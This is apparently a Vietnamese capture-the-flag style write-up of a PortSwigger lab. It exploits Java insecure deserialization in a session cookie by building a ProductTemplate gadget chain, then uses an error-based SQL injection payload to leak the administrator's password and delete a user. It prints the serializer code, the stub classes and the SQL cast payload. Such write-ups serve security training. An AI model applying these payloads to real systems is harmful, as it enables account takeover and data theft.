<img width="1490" height="1015" alt="image" src="https://github.com/user-attachments/assets/5e94b100-e5fc-4fa8-bff5-76a85ca05320" />

Yêu cầu: Login bằng account `administrator` rồi xóa user carlos.

Gợi ý: lab này sử dụng cơ chế phiên (session) dựa trên quá trình tuần tự hóa (serialization) và do đó dính lỗ hổng tiêm đối tượng tùy ý (arbitrary object injection). Tự build gadget chain để
lấy đước password của `administrator`.

Account: `wiener:peter`

<img width="2491" height="1443" alt="image" src="https://github.com/user-attachments/assets/315cd0ef-8166-4e54-933a-87d958d98085" />

Sau khi đăng nhập xong thì ta sẽ đọc giá trị `cookie`.

<img width="2563" height="1021" alt="image" src="https://github.com/user-attachments/assets/862e493b-f995-4e47-b185-4ce380734e08" />

Cookie này đang được mã hóa ở dạng `base64`.

Tiếp là ta sẽ bật view source code lên xem thì phát hiện ở đây có chứa thư mục backup.

<img width="2501" height="1443" alt="image" src="https://github.com/user-attachments/assets/8263ee99-186e-4c7b-a875-e54a224994ca" />

Ta sẽ thử đi tới đường dẫn tới file bên trong thư mục backup được note lại.

```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

Nội dung trong file đó như trên thì là file chứa class khởi tạo user. Tiếp tục ta xem ở trong folder backup còn có file nào khác không?

<img width="1712" height="448" alt="image" src="https://github.com/user-attachments/assets/3de5b0f7-2820-455b-80d4-955b77458a54" />

Ở đây ta phát hiện thêm 1 file nữa đó là `ProductTemplate.java`

```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

Ở đây ta phát hiện ra trong file này có dùng tới SQL query và giá trị được truyền vào là `id` - 1 giá trị ta có thể thay đổi được, vậy ta sẽ tạo gadget chain dựa vào class này.

```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

import data.productcatalog.ProductTemplate;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate originalObject = new ProductTemplate(
                "Sample Product");

        String serializedObject = serialize(originalObject);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized data: " + deserializedObject);
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(
                new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

Tôi dùng script trên mà portswigger cung cấp để tạo tự động payload và ở đây ta tạo thêm folder chứa class `ProductTemplate.java` thì ở đây ta phải tạo đúng theo tên package và không được
sửa Tên package, tên class, serialVersionUID, tên biến, kiểu dữ liệu. Nếu đổi, Server sẽ báo lỗi `ClassNotFoundException` hoặc `InvalidClassException` và từ chối chạy.

```java
package data.productcatalog;

import java.io.Serializable;

public class ProductTemplate implements Serializable {
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id) {
        this.id = id;
    }

    public String getId() {
        return id;
    }

    public Product getProduct() {
        return product;
    }
}
```

Thì ở bên trong này có khởi tới 1 object Product thì ta sẽ phải tạo thêm 1 class Product nữa.

```java
package data.productcatalog;

class Product {

}
```

nhưng do ta không dùng tới nên ta sẽ chỉ tạo rỗng 1 class `Product`. Việc tạo class Product rỗng chỉ nhằm mục đích vượt qua lỗi biên dịch tại local; lớp này hoàn toàn không ảnh hưởng đến 
payload gửi lên Server vì biến đối tượng đã được đánh dấu là transient (sẽ bị bỏ qua trong quá trình tuần tự hóa).

Vậy ta bắt đầu payload bằng truyền vào biến id giá trị đơn giản như `'` để xem respone của server.

<img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/ced3f231-94b4-4430-882a-993c27112307" />

Có thể thấy ở đây server đã trả về đầy đủ respone sau khi lỗi của SQL query. Vậy ta sẽ lợi dụng cái eror respone này để ép nó trả về password của `administrator`.

Tôi dùng payload như sau cho vào biến `id` để nó trả về lỗi ép kiểu là 

```sql
'||(SELECT CAST((SELECT password FROM users LIMIT 1) AS int)) --
```

Và nó trả về kết quả là không thể ép kiểu chuỗi `a85kyzqd03pu978bbi36` thành interger

<img width="2563" height="1269" alt="image" src="https://github.com/user-attachments/assets/cfe37212-4b97-4688-bdfb-19998a50cbed" />

Thì chính cái chuỗi kia chính là password của `administrator` ta cần tìm.

<img width="2525" height="1442" alt="image" src="https://github.com/user-attachments/assets/b74f0913-d740-4be5-ad8d-3a8039d1b4f9" />

Ta đã thành công đăng nhập vào account của `administrator`. Giờ chỉ cần xóa user `Carlos`.

<img width="2511" height="1443" alt="image" src="https://github.com/user-attachments/assets/1e5cac1c-ef66-4ec2-b742-2878fb38acc1" />
